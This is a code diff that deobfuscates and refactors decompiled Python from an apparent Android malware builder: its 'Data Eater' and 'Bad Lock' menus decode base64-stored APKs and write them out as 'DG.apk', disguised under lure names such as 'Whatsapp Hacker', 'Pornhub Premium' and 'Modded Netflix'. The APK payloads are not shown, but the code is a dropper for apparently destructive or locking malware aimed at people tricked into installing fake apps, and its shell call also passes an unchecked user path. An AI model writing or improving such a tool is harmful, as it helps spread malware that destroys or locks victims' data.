@@ -1,102 +1,98 @@
 # Source Generated with Decompyle++
 # File: deater.pyc (Python 3.8)
-
 from files.startup import *
+import base64
+import os
 
 def deater():
-    O000OO00OOOOOO00O = red + '[' + green + '0' + red + ']'
-    OOOO00O00000O0O0O = [
+    menu_prefix = red + '[' + green + '0' + red + ']'
+    menu_options = [
         'WpsApp Pro',
-        'Pornhub Premuim',
+        'Pornhub Premium',
         'Whatsapp Hacker',
         'Termux',
-        'Moded Netflix',
+        'Modded Netflix',
         'NetHunter',
         'Wifi Kill',
         'Aircrack-ng',
         'CardingApp',
-        'Exit']
-    O0OOOO000OO0O00OO = 0
-    while O0OOOO000OO0O00OO < len(OOOO00O00000O0O0O):
-        slow('\n\r' + O000OO00OOOOOO00O.replace('0', str(O0OOOO000OO0O00OO + 1)) + yellow + ' ' + OOOO00O00000O0O0O[O0OOOO000OO0O00OO], 0.005)
-        O0OOOO000OO0O00OO = O0OOOO000OO0O00OO + 1
-        continue
-    OO0OOOO00OO0OO00O = '/sdcard'
+        'Exit'
+    ]
+    for idx, option in enumerate(menu_options, 1):
+        slow('\n\r' + menu_prefix.replace('0', str(idx)) + yellow + ' ' + option, 0.005)
+    default_path = '/sdcard'
     print('\n')
-    O0O0OO0OO0O00OOO0 = input(green + 'Data Eater ' + red + '>' + yellow)
-    O00O0000OO00O0O00 = 'null'
-    if O0O0OO0OO0O00OOO0 == '1':
-        O00O0000OO00O0O00 = 'wps'
-    elif O0O0OO0OO0O00OOO0 == '2':
-        O00O0000OO00O0O00 = 'ph'
-    elif O0O0OO0OO0O00OOO0 == '3':
-        O00O0000OO00O0O00 = 'wa'
-    elif O0O0OO0OO0O00OOO0 == '4':
-        O00O0000OO00O0O00 = 'tmx'
-    elif O0O0OO0OO0O00OOO0 == '5':
-        O00O0000OO00O0O00 = 'nf'
-    elif O0O0OO0OO0O00OOO0 == '6':
-        O00O0000OO00O0O00 = 'nh'
-    elif O0O0OO0OO0O00OOO0 == '7':
+    user_choice = input(green + 'Data Eater ' + red + '>' + yellow)
+    apk_type = 'null'
+    if user_choice == '1':
+        apk_type = 'wps'
+    elif user_choice == '2':
+        apk_type = 'ph'
+    elif user_choice == '3':
+        apk_type = 'wa'
+    elif user_choice == '4':
+        apk_type = 'tmx'
+    elif user_choice == '5':
+        apk_type = 'nf'
+    elif user_choice == '6':
+        apk_type = 'nh'
+    elif user_choice in ['7', '8', '9']:
         soon()
-    elif O0O0OO0OO0O00OOO0 == '8':
-        soon()
-    elif O0O0OO0OO0O00OOO0 == '9':
-        soon()
-    elif O0O0OO0OO0O00OOO0 == '10':
+        return
+    elif user_choice == '10':
         exit(0)
-    OO0OOOO00OO0OO00O = input(green + 'path :' + red)
-    bbase64('de', O00O0000OO00O0O00, OO0OOOO00OO0OO00O + 'DG.apk')
-    slow(green + 'Generated as ' + red + OO0OOOO00OO0OO00O + 'DG.apk', 0.1)
+    output_path = input(green + 'path :' + red)
+    decode_base64('de', apk_type, output_path + 'DG.apk')
+    slow(green + 'Generated as ' + red + output_path + 'DG.apk', 0.1)
 
-
-def bbase64(OOOO0OOO0OO0000OO, O00O00OOO000O0OO0, OOO0O000O00O0000O):
-    os.system('base64 -d ' + str(OOOO0OOO0OO0000OO) + '/' + str(O00O00OOO000O0OO0) + '>' + str(OOO0O000O00O0000O))
-
+def decode_base64(folder, apk_type, output_file):
+    input_file = os.path.join(folder, apk_type)
+    try:
+        if os.name == 'nt':  # Windows
+            with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
+                base64.decode(f_in, f_out)
+        else:  # Linux/Unix
+            os.system(f'base64 -d "{input_file}" > "{output_file}"')
+    except Exception as e:
+        print(f"Error decoding file: {e}")
 
 def block():
-    O000OO00OOOOOO00O = red + '[' + green + '0' + red + ']'
-    OOOO00O00000O0O0O = [
+    menu_prefix = red + '[' + green + '0' + red + ']'
+    menu_options = [
         'WpsApp Pro',
-        'Pornhub Premuim',
+        'Pornhub Premium',
         'Whatsapp Hacker',
         'Termux',
-        'Moded Netflix',
+        'Modded Netflix',
         'NetHunter',
         'Wifi Kill',
         'Aircrack-ng',
         'CardingApp',
-        'Exit']
-    O0OOOO000OO0O00OO = 0
-    while O0OOOO000OO0O00OO < len(OOOO00O00000O0O0O):
-        slow('\n\r' + O000OO00OOOOOO00O.replace('0', str(O0OOOO000OO0O00OO + 1)) + yellow + ' ' + OOOO00O00000O0O0O[O0OOOO000OO0O00OO], 0.005)
-        O0OOOO000OO0O00OO = O0OOOO000OO0O00OO + 1
-        continue
-    OO0OOOO00OO0OO00O = '/sdcard'
+        'Exit'
+    ]
+    for idx, option in enumerate(menu_options, 1):
+        slow('\n\r' + menu_prefix.replace('0', str(idx)) + yellow + ' ' + option, 0.005)
+    default_path = '/sdcard'
     print('\n')
-    O0O0OO0OO0O00OOO0 = input(green + 'Bad Lock ' + red + '>' + yellow)
-    O00O0000OO00O0O00 = 'null'
-    if O0O0OO0OO0O00OOO0 == '1':
-        O00O0000OO00O0O00 = 'wps'
-    elif O0O0OO0OO0O00OOO0 == '2':
-        O00O0000OO00O0O00 = 'ph'
-    elif O0O0OO0OO0O00OOO0 == '3':
-        O00O0000OO00O0O00 = 'wa'
-    elif O0O0OO0OO0O00OOO0 == '4':
-        O00O0000OO00O0O00 = 'tmx'
-    elif O0O0OO0OO0O00OOO0 == '5':
-        O00O0000OO00O0O00 = 'nf'
-    elif O0O0OO0OO0O00OOO0 == '6':
-        O00O0000OO00O0O00 = 'nh'
-    elif O0O0OO0OO0O00OOO0 == '7':
+    user_choice = input(green + 'Bad Lock ' + red + '>' + yellow)
+    apk_type = 'null'
+    if user_choice == '1':
+        apk_type = 'wps'
+    elif user_choice == '2':
+        apk_type = 'ph'
+    elif user_choice == '3':
+        apk_type = 'wa'
+    elif user_choice == '4':
+        apk_type = 'tmx'
+    elif user_choice == '5':
+        apk_type = 'nf'
+    elif user_choice == '6':
+        apk_type = 'nh'
+    elif user_choice in ['7', '8', '9']:
         soon()
-    elif O0O0OO0OO0O00OOO0 == '8':
-        soon()
-    elif O0O0OO0OO0O00OOO0 == '9':
-        soon()
-    elif O0O0OO0OO0O00OOO0 == '10':
+        return
+    elif user_choice == '10':
         exit(0)
-    OO0OOOO00OO0OO00O = input(green + 'path :' + red)
-    bbase64('bl', O00O0000OO00O0O00, OO0OOOO00OO0OO00O + 'DG.apk')
-    slow(green + 'Generated as ' + red + OO0OOOO00OO0OO00O + 'DG.apk', 0.1)
-
+    output_path = input(green + 'path :' + red)
+    decode_base64('bl', apk_type, output_path + 'DG.apk')
+    slow(green + 'Generated as ' + red + output_path + 'DG.apk', 0.1)
